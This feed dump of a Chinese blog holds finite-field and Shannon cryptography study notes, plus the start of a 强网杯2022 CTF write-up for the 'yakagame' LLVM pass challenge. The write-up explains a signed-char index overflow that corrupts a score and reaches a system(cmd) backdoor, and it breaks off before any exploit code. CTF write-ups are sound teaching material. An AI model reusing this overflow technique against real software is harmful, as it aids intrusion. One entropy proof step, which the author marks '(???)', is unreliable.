color=red>$x^{q^n}-x$可以表示为所有次数为n的因子的首1不可约多项式的乘积，每个因式仅出现一次 <strong>（注意理解：n的因子！如当n&#x3D;4时，所有1、2、4次不可约多项式都是其因子）</strong> </font></p><hr><p><font color=purple>定理3.25</font> 设$\mathbb F_q$为q元域，n为正整数，那么$\mathbb F_q$上一定存在n次不可约多项式。</p><p><font color=dblue>证明方法：</font>容斥原理</p><p>$\phi(k)$为$\mathbb F_q$上次数为$k$的因子的首1不可约多项式的乘积，即$\phi(k)&#x3D;x^{q^k}-x$，$A$为$n$次首1不可约多项式的乘积。<br>设$n&#x3D;\prod_{i&#x3D;1}^S p_i^{\alpha_i}$<br>$$A&#x3D;\phi(n)\cdot\prod_{1\le i\le S}\phi(\frac{n}{p_i})^{-1}\prod_{1\le i_1&lt;i_2\le S}\phi(\frac{n}{p_{i_1}p_{i_2}})…\phi(\frac{n}{p_1p_2…p_S})^{(-1)^S}$$</p><p>首先，次数不是n的因子的首1不可约多项式，在等式两边都不出现。<br>其次，任何一个次数为n的首1不可约多项式在等式两边各出现1次，分别在$A$和$\phi(n)$中<br>再者，对于任意$d|n,d&lt;n$，设<br>$$d&#x3D;p_1^{f_1}p_2^{f_2}…p_r^{f_r}p_{r+1}^{\alpha_{r+1}}…p_S^{\alpha_S}$$<br>那么在$\frac{n}{p_{i_1}p_{i_2}…p_{i_t}}(0\le t&lt;s,1\le i_1&lt;i_2&lt;…&lt;i_t\le S)$中，只有n,$\frac{n}{p_i}(1\le i\le r),\frac{n}{p_ip_j}(1\le i&lt;j\le r),…,\frac{n}{p_1p_2…p_r}$以d为因子，所以任一d次首1不可约多项式在等式右边出现的次数为：$1-\begin{pmatrix} r \ 1 \end{pmatrix}+\begin{pmatrix} r \ 2 \end{pmatrix}-…+(-1)^r\begin{pmatrix} r \ r \end{pmatrix}&#x3D;(1-1)^r&#x3D;0$。显然其在左边出现次数也为0，等式得证。</p><p>又$\phi(n)&#x3D;x^{q^n}-x$，所以<br>$$\deg A&#x3D;q^n-\sum_{1\le i\le S}q^{\frac{n}{p_i}}+\sum_{1\le i_1&lt;i_2\le S}q^{\frac{n}{p_{i_1}p_{i_2}}}+…+(-1)^S q^\frac{n}{p_1p_2…p_S}$$<br>故$\deg A\equiv (-1)^Sq^\frac{n}{p_1p_2…p_S}\ne 0 (\mod q^{\frac{n}{p_1p_2…p_S}+1})$[$q^{\frac{n}{p_1p_2…p_S}+1}|q^n$，前面项全消去仅剩最后一项]，故$\deg A&gt;0$，因此$A$至少包含1个不可约多项式</p><hr><p><font color=purple>定理3.26</font> 对于任意素数$p$，正整数$n$，$p^n$元有限域一定存在。</p><p><font color=dblue>证明方法：</font>根据定理3.25能在$\mathbb Z_p$找到n次不可约多项式，因此可以根据定理3.16构造一个元素个数为$p^n$的有限域。</p><hr><p><font color=red>若$\mathbb F_{q^n}$是$\mathbb F_q$的扩域，则$\mathbb F_{q^n}$可以看做$\mathbb F_q$的n维向量空间，一组基能够按照定理3.18的方式构造：${1,\beta_1,\beta_2,…\beta_{n-1}}$，$\mathbb F_{q^n}$中任意一个元素可以唯一表示为</font><br>$$a_0+a_1\beta_1+…+a_{n-1}\beta_{n-1},a_i\in\mathbb F_q$$<br>的形式。</p><p>如${1,x,x^2,…,x^{n-1}}$就是一组基。</p><hr><p><font color=green>引理1</font> 设群$G$的元素$\alpha$的阶为$n$，则对于任意整数m，$ord(\alpha^m)&#x3D;\frac{n}{(m,n)}$</p><p>证明：设$ord(a^m)&#x3D;d$，分别证明$d|\frac{n}{(m,n)},\frac{n}{(m,n)}|d$即可。<br>$d|\frac{n}{(m,n)}$易证<br>$(\alpha^m)^d&#x3D;1$，故$n|md$，即$\frac{n}{(m,n)}|\frac{m}{(m,n)}d$，且有$(\frac{m}{(m,n)},\frac{n}{(m,n)})&#x3D;1$，故$\frac{n}{(m,n)}|d$</p><hr><p><font color=green>引理2</font> 设群$G$中，$ord(\alpha)&#x3D;m,ord(\beta)&#x3D;n$，若$(m,n)&#x3D;1$，则$ord(\alpha\beta)&#x3D;mn$<br>证明：证明思路与引理1相同<br>$d|mn$易证<br>$(\alpha\beta)^d&#x3D;1$，故$\alpha^d&#x3D;\beta^{-d}$，故$ord(\alpha^d)&#x3D;\frac{m}{(d,m)}&#x3D;\frac{n}{(-d,m)}&#x3D;ord(\beta^{-d})$。$(m,n)&#x3D;1\Rightarrow(\frac{m}{(d,m)},\frac{n}{(d,n)})&#x3D;1,\frac{m}{(d,m)}&#x3D;\frac{n}{(d,n)},\therefore \frac{m}{(d,m)}&#x3D;\frac{n}{(d,n)}&#x3D;1$。故$m|d,n|d\Rightarrow mn|d$</p><hr><p><font color=purple>定理3.27</font> 有限域的乘法群是循环群。</p><p><font color=dblue>证明方法：</font>设$\mathbb F_{p^n}$是元素个数为$p^n$的有限域，其乘法群元素个数为$p^n-1$，设$\alpha$是其中阶最大的元素，设其阶$ord(\alpha)&#x3D;d$，则$d|p^n-1$，故有$d\le p^n-1$。<br>对任意$\beta\in\mathbb F_{p^n}$，设$ord(\beta)&#x3D;s&#x3D;\prod_{i&#x3D;1}^t p_i^{\alpha_i},d&#x3D;\prod_{i&#x3D;1}^t p_i^{\beta_i},\alpha_i\ge 0,\beta_i\ge 0$，那么$[d,s]&#x3D;\prod_{i&#x3D;1}^tp_i^{\max{\alpha_i, \beta_i}}$，将前面的式子拆分为两份：$s’&#x3D;\prod_{\alpha_i\ge \beta_i}p_i^{\alpha_i},d’&#x3D;\prod_{\alpha_i&lt;\beta_i}p_i^{\beta_i}$，则易得$d’|d,s’|s,(d,s)&#x3D;1,d’s’&#x3D;[d,s]$，此时$ord(\alpha^{\frac{d}{d’}})&#x3D;d’,ord(\beta^{\frac{s}{s’}})&#x3D;s’$，由引理2可得，$ord(\alpha^{\frac{d}{d’}}\beta^{\frac{s}{s’}})&#x3D;d’s’&#x3D;[d,s]\le d$，因为d是最大的阶。故有$s|d$。于是$\mathbb F_{p^n}^*$中任意一个元素的阶都是d的因子，即$\mathbb F_{p^n}^*$中$p^n-1$个元素均为$x^d-1&#x3D;0$的根，故有$p^n-1\le d$。综上有$d&#x3D;p^n-1$，证毕。</p><p><font color=red>将域乘法群的生成元称为其本原元。</font></p><hr><p><font color=blue>定义3.12</font> 极小多项式：$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，则$\mathbb F$中任意一个元素$\alpha$在$\mathbb F_q$上的极小多项式指$\mathbb F_q$上以$\alpha$为根的首1不可约多项式。<font color=red><strong>（$\alpha$为$\mathbb F_q$扩域上，$\mathbb F$上元素，故其不一定是$\mathbb F_q$上元素，因此虽然$x-\alpha$整除该多项式，但该多项式不一定就是$x-\alpha$。但如果$\alpha\in\mathbb F_q$，则该多项式就是$x-\alpha$）</strong></font></p><hr><p><font color=purple>群的定理</font> 设$<a>$为由a构成的循环群，则：</p><ol><li>$<a>$的子群都是循环群</li><li>对于任意正整数$d|n$，$<a>$存在唯一d元子群</li><li>若整数$s,t$不全为0，则$&lt;a^s,a^t&gt;&#x3D;{a^{sx+ty}}&#x3D;&lt;a^{(s,t)}&gt;$</li></ol><hr><p><font color=green>引理3</font> 设$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，$\mathbb F$任一元素$\alpha$在$\mathbb F_q$上的极小多项式存在且唯一。<br>证明：存在性。设$|\mathbb F|&#x3D;q^n$，则其中任意一个元素一定为$x^{q^n}-x$的根，其可以在$\mathbb F$中分解为若干首1不可约多项式的乘积：$x^{q^n}-x&#x3D;p_1(x)p_2(x)…p_s(x),p_i(x)\in\mathbb F_q[x]$，故存在$1\le i\le s,p_i(\alpha)&#x3D;0$，$p_i(x)$即为$\mathbb F_q$上的极小多项式。<br>唯一性。由定理3.24定理的推论，不存在重根，设存在两个极小多项式$a(x),b(x)$，因为$(a(x),b(x))&#x3D;1$，代入$\alpha$可得：$0&#x3D;s(\alpha)a(\alpha)+t(\alpha)b(\alpha)&#x3D;1$，矛盾。</p><p>由上可知，$\alpha$在$\mathbb F_q$上的极小多项式是以$\alpha$为根的次数最低的多项式，且唯一。（反证法：假设可约则存在有次数更低的多项式，代入$\alpha$得其中一个多项式必为0，矛盾）</p><hr><p><font color="0080FF">结论1</font> 设$f(x)$是一个n次不可约多项式，那么包含$f(x)$的根$\alpha$的最小扩域为$\mathbb F_{q^n}$，所有包含$f(x)$的根的域都是$\mathbb F_{q^n}$的扩域。</p><p><font color=dblue>证明：</font>设包含$f(x)$的根$\alpha$的最小扩域为$\mathbb F_{q^k}$，设<br>$$x^{q^k}-x&#x3D;g(x)f(x)+r(x),\deg r(x)&lt;\deg f(x)$$<br>代入$\alpha$可得$r(x)&#x3D;0$，即$\alpha$是r(x)的一个根，但f(x)是$\mathbb F_q$上以$\alpha$为根的次数最小的多项式，因此r(x)只能为0。<br>故$f(x)|x^{q^k}-x,n|k$，最小正整数k即为n（定理3.20，3.22）</p><hr><p><font color="0080FF">结论2</font> $\mathbb F_q$为q元有限域，那么其扩域$\mathbb F_{q^n}$中包含所有次数为n的因子的不可约多项式的所有根，而不包含次数不为n的因子的不可约多项式的任何根。</p><p><font color=dblue>证明：</font>由结论1易证。</p><hr><p><font color=green>引理4</font> 设$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，$\alpha\in\mathbb F^*$，$\alpha$的阶为m，设k是使$q^k\equiv1(\mod m)$的最小正整数，则$\alpha$在$\mathbb F_q$上的极小多项式为k次，该多项式的k个根为$\alpha,\alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}}$。若$|\mathbb F|&#x3D;q^n$，$\alpha$为$\mathbb F$的本原元，则$\alpha$在$\mathbb F_q$上的极小多项式一定为n次。</p><p>证明：构造k次多项式<br>$$g(x)&#x3D;(x-\alpha)(x-\alpha^q)…(x-\alpha^{q^{k-1}})$$<br>对于$0\le i\le k$，g(x)的1次项系数可以看做$\mathbb F_q$的素域$\mathbb F_p$上的k元多项式，不妨设为$c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}})$，即$g(x)&#x3D;\sum_{i&#x3D;0}^kc_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}})x^i$<br>由$q^k\equiv 1(\mod m)$，$\alpha$的阶为m，得到$\alpha^{q^k}&#x3D;\alpha$，又q为p的幂，因此由定理3.5：<br>$$(c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}}))^q&#x3D;c_i(\alpha^q,\alpha^{q^2},…,\alpha^{q^{k}})&#x3D;c_i(\alpha^q,\alpha^{q^2},…,\alpha)$$<br>又$g(x)&#x3D;(x-\alpha^q)…(x-\alpha^{q^{k-1}})(x-\alpha)$，所以g(x)的i次项系数又可以表示为$c_i(\alpha^q,\alpha^{q^2},…,\alpha)$，也即$c_i(\alpha^q,\alpha^{q^2},…,\alpha)&#x3D;c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}})$。因此有<br>$$(c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}}))^q&#x3D;c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}})$$<br>由定理3.19可知$c_i(\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}})\in\mathbb F_q$，即$g(x)\in\mathbb F_q[x]$</p><p>下面证明$g(x)$在$\mathbb F_q[x]$中不可约。<br>易得$\alpha, \alpha^q,\alpha^{q^2},…,\alpha^{q^{k-1}}$互不相等。若存在两项$\alpha^{q^i},\alpha^{q^j}$相等，则$\alpha^{q^i(q^{j-i}-1)}&#x3D;1$，故$m|q^i(q^{j-i}-1)$。由$q^k\equiv 1(\mod m)$可知$(q,m)&#x3D;1$<strong>（q^k^和1属于模m的同一个剩余类，故(q^k^,m)&#x3D;(1,m)&#x3D;1，即有(q,m)&#x3D;1）</strong>，故$m|q^{j-i}-1$，即$q^{j-i}\equiv 1(\mod m)$，但$0&lt;j-i&lt;k$，与k最小矛盾。</p><p>若$g(x)$在$\mathbb F_q[x]$上可约，则存在因式$f_1(x),f_2(x)\in\mathbb F_q[x]$<br>由$g(\alpha)&#x3D;0$可得$f_1(\alpha)&#x3D;0$或$f_2(\alpha)&#x3D;0$，不妨设$f_1(\alpha)&#x3D;0$，则有$f_1(\alpha)&#x3D;f_1(\alpha^q)&#x3D;…&#x3D;f_1(\alpha^{q^{k-1}})&#x3D;0$<strong>（$f_1(\alpha)&#x3D;\sum_{i&#x3D;0}^Sa_i\alpha^i,a_i^q&#x3D;a_i$，故$f_1(\alpha)&#x3D;\sum_{i&#x3D;0}^Sa_i\alpha^{qi}&#x3D;\sum_{i&#x3D;0}^Sa_i^q\alpha^{qi}&#x3D;(f_1(\alpha))^q&#x3D;0$）</strong>，其根的个数超过其次数，矛盾。</p><p>由极小多项式的定义和唯一性可知g(x)即为$\alpha$在$\mathbb F_q$上的极小多项式。<br><font color=red><strong>所有根的阶数均为m。</strong></font></p><hr><p><font color=green>引理5</font> 设$\mathbb F_q$是元素个数为q的有限域，$f(x)$为$\mathbb F_q$上的$n(n\ge 1)$的首1不可约多项式，$\mathbb F_{q^n}$为$\mathbb F_q$的任一扩域，那么$f(x)$在$\mathbb F_{q^n}$中有根，且若$\alpha$是$f(x)$在$\mathbb F_{q^n}$中的一个根，那么$f(x)$在$\mathbb F_{q^n}$中的所有根为$\alpha,\alpha^q,\alpha^{q^2},…,\alpha^{q^{n-1}}$。</p><p>证明：当$f(x)&#x3D;cx,c\in\mathbb F_q^*$时，结论成立。<br>不妨设$f(x)$是首一n次不可约多项式，且$f(x)\ne cx,c\in \mathbb F_q^*$。由定理3.20可知$f(x)|x^{q^n}-x$，而$\mathbb F_{q^n}$中所有$q^n$个元素均为$x^{q^n}-x$的根。令$x^{q^n}-x&#x3D;f(x)g(x),\deg g(x)&#x3D;q^n-n$，则$x^{q^n}-x$的根一定是f(x)或g(x)的根，且f(x)的根至少有n个。又$\deg f(x)&#x3D;n$，则f(x)有n个根。</p><p>$\alpha$是$f(x)$在$\mathbb F_{q^n}$中的一个根，则$f(x)$为$\alpha$在$\mathbb F_q$上的极小多项式，其所有根为$\alpha,\alpha^q,\alpha^{q^2},…,\alpha^{q^{n-1}}$。</p><hr><p><font color=blue>定义3.13</font> 极小多项式所有根的阶称为多项式的周期，周期为最大（$q^n-1$）时称该多项式为$\mathbb F_q$上的本原多项式</p><hr><p><font color=purple>定理3.28</font> 所有元素相同的有限域均同构。</p><p><font color=dblue>证明方法：</font></p><hr><p><font color=purple>定理3.29</font> （有限域伽罗华定理）设p为素数，$\mathbb F_{p^n}$为元素个数为p^n^的有限域，$\alpha$为$\mathbb F_{p^n}$的本原元，$\alpha$在$\mathbb F_p$上的极小多项式为n次本原多项式$f(x)$，则：<br>(1) $\mathbb F_{p^n}$的任意自同构都保持其素域$\mathbb F_p$中的元素不变。<br>(2) $\mathbb F_{p^n}$的任意自同构都只能将$f(x)$的根映射成$f(x)$的根。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础 Chapter 2——香农理论（二）</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="九、密码学中的熵关系"><a href="#九、密码学中的熵关系" class="headerlink" title="九、密码学中的熵关系"></a>九、密码学中的熵关系</h2><h3 id="定理2-10"><a href="#定理2-10" class="headerlink" title="定理2.10"></a>定理2.10</h3><p>设$(P,C,K,E,D)$是一个密码体制，那么有$H(K|C)&#x3D;H(K)+H(P)-H(C)$<br>即截获密文后，密钥的熵等于明文的熵加密钥的熵减密文的熵（密钥含糊度）</p><p>证明：<br>由定理2.8：$H(K|C)&#x3D;H(KC)-H(C)$<br>明文与密钥之间没有任何统计规律，故有$H(KP)&#x3D;H(K)+H(P)$<br>由密码体制的性质，当明文和密钥已知时，密文也随之确定，则有$H(C|KP)&#x3D;0$（信息量为0）<br>同理当密文与密钥已知时，明文也随之确定，故$H(P|KC)&#x3D;0$<br>由定理2.8：$H(PKC)&#x3D;H(P|KC)+H(KC)&#x3D;H(KC),H(CKP)&#x3D;H(C|KP)+H(KP)&#x3D;H(KP)$<br>故有$H(KC)&#x3D;H(KP)&#x3D;H(K)+H(P)$<br>故$H(K|C)&#x3D;H(K)+H(P)-H(C)$，证毕。</p><h3 id="一般密码体制与熵有关的性质"><a href="#一般密码体制与熵有关的性质" class="headerlink" title="一般密码体制与熵有关的性质"></a><font color=red>一般密码体制与熵有关的性质</font></h3><ol><li>$|P|\le|C|$（从明文空间到密文空间必为单射）</li><li>$H(P|KC)&#x3D;H(C|KP)&#x3D;0$（见定理2.10证明部分）</li><li>$H(PK)&#x3D;H(P)+H(K)$（见定理2.10证明部分）</li><li>定理2.10结论</li><li>$H(P)\le H(C)\le H(P)+H(K)$（$H(K|C)\le H(K)$，由定理2.10推出）</li><li>$H(P|C)\le H(K|C)$</li></ol><p>推论：若$|P|&#x3D;|C|$，且P随机等概率分布，则C一定随机等概率分布。此时$H(K|C)&#x3D;H(K)$<br>对于完善保密体制，还有下面的性质：</p><ol start="7"><li>$H(P|C)&#x3D;H(P)$</li><li>$|P|\le |C|\le |K|(Pr[y|x]&#x3D;Pr[y]&gt;0)$</li><li>$H(P)\le H(C)\le H(K)$</li></ol><p>6.证明：<br>$$H(K|C)&#x3D;H(KC)-H(C),H(P|C)&#x3D;H(PC)-H(C)\<br>即证H(KC)\ge H(PC)\<br>H(KPC)&#x3D;H(PC)+H(K|PC)&#x3D;H(KC)+H(P|KC)\<br>H(P|KC)&#x3D;0,H(K|PC)&gt;0\Rightarrow H(KC)\ge H(PC)$$</p><p>9.证明：密钥随机等概率分布且由8可知，$H(C)\le H(K)$<br>$H(P)&#x3D;H(P|KC)+H(PK)+H(CP|K)&#x3D;H(C|K)\le H(C)$(???)</p><p><img src="https://img-blog.csdnimg.cn/d8681db88eae446e8a9a6e63682492af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/ac5e1a8a33d7442aa7314a0f21092421.png"><br><img src="https://img-blog.csdnimg.cn/0da7a41c78ce483291d639eca3345028.png"><br>上图中：<br>绿+紫&#x3D;$I(X;Y)$；蓝+紫&#x3D;$I(Y;Z)$；青+紫&#x3D;$I(X;Z)$<br>绿&#x3D;$I(X;Y|Z)$；蓝&#x3D;$I(Y;Z|X)$；青&#x3D;$I(X;Z|Y)$<br>红&#x3D;$H(X|YZ)$；橙&#x3D;$H(Y|XZ)$；黄&#x3D;$H(Z|XY)$<br>紫&#x3D;$I(X;Y;Z)$<br>红+青&#x3D;$H(X|Y)$；橙+蓝&#x3D;$H(Y|X)$；<br>红+绿&#x3D;$H(X|Z)$；黄+蓝&#x3D;$H(Z|X)$；<br>橙+绿&#x3D;$H(Y|Z)$；黄+青&#x3D;$H(Z|Y)$；<br>除黄所有&#x3D;$H(XY)$；除红所有&#x3D;$H(YZ)$；除橙所有&#x3D;$H(XZ)$<br>青+紫+蓝&#x3D;$I(XY;Z)$；绿+紫+蓝&#x3D;$I(XZ;Y)$；绿+紫+青&#x3D;$I(YZ;X)$<br>红+绿+橙&#x3D;$H(XY|Z)$；红+青+黄&#x3D;$H(XZ|Y)$；橙+蓝+黄&#x3D;$H(YZ|X)$</p><h2 id="十、伪密钥"><a href="#十、伪密钥" class="headerlink" title="十、伪密钥"></a>十、伪密钥</h2><p>明文串每个分组使用同一个密钥加密得到密文串，考虑唯密文攻击方式，明文为某自然语言时，分析者可以排除某些密钥，但依然存在多个密钥使得明密文满足加解密函数时，其中只有一个密钥是正确的。称其他那些可能但不正确的密钥为伪密钥。（如移位密码对于不同的密钥有不同语义的单词明文出现）<br>（获得同一密钥加密的密文越长，存在伪密钥的可能性越小）</p><h2 id="十一、自然语言的熵"><a href="#十一、自然语言的熵" class="headerlink" title="十一、自然语言的熵"></a>十一、自然语言的熵</h2><p>有随机符号序列$X&#x3D;X_1X_2…X_n$，其中$X_i\in {x_1,x_2,…,x_m}$<br><strong>单符号信源</strong>：仅有一个信号的信源，信号的种类服从一个概率分布。<br><strong>多符号信源</strong>：有多个符号的信源。<br><strong>非平稳信源</strong>——相同字符在不同位置的统计规律也不同：<br>$$H(X_1X_2…X_n)&#x3D;H(X_1)+H(X_2|X_1)+H(X_3|X_2X_1)+…+H(X_n|X_1X_2…X_{n-1})$$<br>若各维联合概率分布与时间起点无关，则称为<strong>离散平稳信源</strong>。有<br>$$H(X_iX_{i+1}…H(X_{i+n-1}))&#x3D;H(X_jX_{j+1}…X_{j+n-1})$$<br><strong>无记忆信源</strong>：每个符号统计独立，其熵值等于每个符号的熵之和。<br><strong>有记忆信源</strong>：每个符号的统计规律有一定的关联<br>极限熵：当序列长度趋近于无穷大时，其中每一个字符的平均熵值：<br>$$H_{\infty}&#x3D;\lim_{n\rightarrow\infty}\frac{1}{n}H(X_1X_2…X_n)&#x3D;\lim_{n\rightarrow\infty}\frac{1}{n}H(X_n|X_1X_2…X_{n-1})$$</p><p><strong>马尔可夫信源</strong>：如果x<del>i</del>只与前面的m个信号（x<del>i-1</del>，…，x<del>i-m</del>）相关，则称为马尔可夫信源<br>$$H(X_n|X_1X_2…X_{n-1})&#x3D;H(X_n|X_1X_2…X_{n-m})$$</p><p>若英语中每个字母是随机使用的，则其熵$H_0&#x3D;\log_226&#x3D;4.7$。但实际上根据每个英文字母在英文中出现的概率计算，英文字母的熵为4.19。随着统计字母组的长度增加，字母平均熵值呈下降趋势，当长度达到一定量时，熵值趋于稳定。</p><p>若定义$P^n$为n字母序列的概率分布构成的随机变量，则$H(P^n)$表示以n个字母为统计对象的熵值，其除以n表示以n个字母为统计对象时，单字母的平均熵<br>定义<strong>自然语言L的熵</strong>为$H_L&#x3D;\lim_{n\rightarrow\infty}\frac{H(P^n)}{n}$<br>统计得出大概范围为1.0~1.5，取1.25</p><p><strong>自然语言冗余度</strong>：<br>$$R_L&#x3D;1-\frac{H_L}{\log_2|P|}&#x3D;\frac{H_0-H_L}{H_0}$$<br>其中$H_0-H_L$称为语言冗余<br>英语约为0.75</p><p><strong>唯一解距离</strong>：使得伪密钥期望值为0所需要的密文分组数量，即在给定足够的计算时间下分析者能够唯一计算出密钥所需明文的平均数量。<br>$$H(K|C^n)&#x3D;H(K)+H(P^n)-H(C^n)\.<br>H(P^n)&#x3D;nH_L(P)&#x3D;n(1-R_L)\log_2|P|,H(C^n)\le n\log_2|C|\<br>H(K|C^n)\ge\log_2|K|-nR_L\log_2|P|$$<br>令$H(K|C^n)&#x3D;0$得<br>$$n\ge \frac{\log_2|K|}{R_L\log_2|P|}$$<br>唯一解距离$n_0&#x3D;\frac{\log_2|K|}{R_L\log_2|P|}$</p><h2 id="十二、乘积密码体制"><a href="#十二、乘积密码体制" class="headerlink" title="十二、乘积密码体制"></a>十二、乘积密码体制</h2><p>对于两个密码体制$S_1,S_2$，其明文空间和密文空间相同（内嵌式密码体制），$S_1&#x3D;(P,P,K_1,E_1,D_1),S_2&#x3D;(P,P,K_2,E_2,D_2)$，则$S_1$和$S_2$的乘积密码体制定义为$S_1\times S_2&#x3D;(P,P,K_1\times K_2,E,D)$<br>$$e_{(k_1,k_2)}(x)&#x3D;e_{k_2}(e_{k_1}(x))\<br>d_{(k_1,k_2)}(x)&#x3D;d_{k_1}(d_{k_2}(x))$$<br>（实际上就是将明文先用S<del>1</del>加密后再用S<del>2</del>加密。）</p><h3 id="幂等密码体制"><a href="#幂等密码体制" class="headerlink" title="幂等密码体制"></a>幂等密码体制</h3><p>使用一个密码体制将明文加密两次即为S^2^，加密n次则为S^n^。<br>若S^2^&#x3D;S则称该密码体制幂等，与自身做乘积无法提高算法安全性。<br>古典密码中的移位、代换、乘法、仿射、置换、维吉尼亚、希尔密码均为幂等。<br><strong>若S<del>1</del>和S<del>2</del>为幂等的且为可交换的，则$S_1\times S_2$也是幂等的</strong><br>如果密码体制不是幂等的，那么可以通过与自身作多次乘积运算（迭代）来提高安全性（<strong>注意</strong>：这里的相等定义要注意，不是说<del>选择一个密钥，将一个明文加密两次和加密一次得到的密文相等</del>）<br>一种构造简单非幂等密码体制的方法是对两个不同的简单密码体制做乘积（必须保证两个密码体制不是可交换的）</p><p><strong>证明两个内嵌式密码体制相等的方法：首先二者的明文空间相同，其次存在一个双射函数使两者密钥空间中的密钥一一对应相等。（两个密钥空间相互包含也可证明两密钥空间相等）[K相等且同分布]</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2022 pwn 赛题解析——yakagame</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakagame/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakagame/</url>
      
        <content type="html"><![CDATA[<p>今天是2022强网杯比赛，笔者能力有限，仅做出来这道题。<br>2022强网杯的所有pwn附件已经上传至<a href="https://github.com/Hornos3/pwnfile">github</a>，请读者自行取用。</p><p>这是一道llvm pass pwn题，有了前面几道题的分析做铺垫，这道题就不算太难了。有趣的是，这道题的出题人就是笔者之前写llvm pass pwn分析文章时参考的主要文章的作者。</p><h1 id="Step-1-找到runOnFunction函数"><a href="#Step-1-找到runOnFunction函数" class="headerlink" title="Step 1: 找到runOnFunction函数"></a>Step 1: 找到runOnFunction函数</h1><p>runOnFunction函数一定在虚函数表的最后被引用，因此我们只要找到虚函数表就能找到runOnFunction的覆写函数：</p><p><img src="https://img-blog.csdnimg.cn/51440c9fb4a5464795d6299cc2761250.png"></p><h1 id="Step-2-分析runOnfunction函数"><a href="#Step-2-分析runOnfunction函数" class="headerlink" title="Step 2: 分析runOnfunction函数"></a>Step 2: 分析runOnfunction函数</h1><h2 id="Segment-1"><a href="#Segment-1" class="headerlink" title="Segment 1"></a>Segment 1</h2><p><img src="https://img-blog.csdnimg.cn/cffc049cb8844d94a53af8a44cbd845b.png"><br>这一段主要是触发循环迭代，可以看到runOnFunction函数只会对函数名为gamestart的函数进行处理。在下面有一个getOpcode函数的调用，这是在遍历函数的指令，获取每一条指令的指令码。通过查询Instructions.def文件可知55表示的是call的指令码，即调用函数的指令码。</p><h2 id="Segment-2"><a href="#Segment-2" class="headerlink" title="Segment 2"></a>Segment 2</h2><p><img src="https://img-blog.csdnimg.cn/494ef608827045d2b18b48c8f7f03e0f.png"><br>这里的getNumOperands函数我们之前说过，其如果传入的是一个call类型的指令对象，那么返回的应该是被调用函数的参数个数+1，因此这里表示fight函数只能有1个参数。看上去出题人想模拟一个游戏，fight传入的参数就是weapon_list的索引，在这里会从weapon_list中取出对应索引的值作为weapon的”攻击力”，然后和boss比较，如果大于等于boss则判定为赢，并赋值给相应的分数；否则判定为输，对分数没有影响。如果分数大于0x12345678就会执行后门函数。后门函数执行system(cmd)，但是初始化的cmd是一段乱码，需要我们对cmd的8个字节做出一些处理。</p><h2 id="Segment-3"><a href="#Segment-3" class="headerlink" title="Segment 3"></a>Segment 3</h2><p><img src="https://img-blog.csdnimg.cn/ed34fd8079184b6f983b4f3b5dbd55aa.png"><br>这里的三个函数分别为merge、destroy、upgrade，融合（将一个weapon的“攻击力”加上另一个weapon的“攻击力”）、销毁（将一个weapon的“攻击力”清零）、升级（将所有weapon的“攻击力”加上一个值）。</p><h2 id="Segment-4"><a href="#Segment-4" class="headerlink" title="Segment 4"></a>Segment 4</h2><p><img src="https://img-blog.csdnimg.cn/dd514afb739c483ba0509de8cf506208.png"><br>然后是上面的这4个函数名。看上去像是拼音。笔者还特地查了一下这些都是什么梗，查了之后发现全都是原神的梗，看来出题人还是一位原神玩家（笑）。我们可以看到这4个函数都会对cmd的8个字节进行一些处理，不过是统一异或、加减ASCII码。看上去像是一种加密方式，需要我们对这4中操作进行合理排序以获得真正想要执行的命令。</p><h2 id="Segment-5"><a href="#Segment-5" class="headerlink" title="Segment 5"></a>Segment 5</h2><p><img src="https://img-blog.csdnimg.cn/c69b9a0207354bfbbce435ec726c4bb1.png"><br>如果被调用的函数的函数名不是上面的任何一个，那么这里会使用到一个map变量。首先会遍历map查找是否有以这个函数名为key的value。如果有就会在weapon_list的特定位置赋值为value。这里weapon的特定位置与遍历的顺序有关。这个key在第几次循环中被遍历到，那么就会在weapon_list的第几的位置赋值。</p><p><img src="https://img-blog.csdnimg.cn/97873df9e81e413b9fc758ee9559b4fe.png"><br>如果在map中没有找到这个key值，那么就会向map中插入这个key值，将对应的value设置为第二个参数的值。</p><p>这段代码具有至关重要的作用，因为只有这里能够产生溢出。不知道细心的读者有没有发现，为weaponlist赋值的索引v33是一个char类型变量，是一个有符号数。而存放score的地址正好就在weaponlist上面。如果map中的key值足够多，那么多次遍历后，v33就有可能变成一个负数，影响到score的值。</p><p><img src="https://img-blog.csdnimg.cn/236500bdb14d460291de09c9a73c44fe.png"><br><img 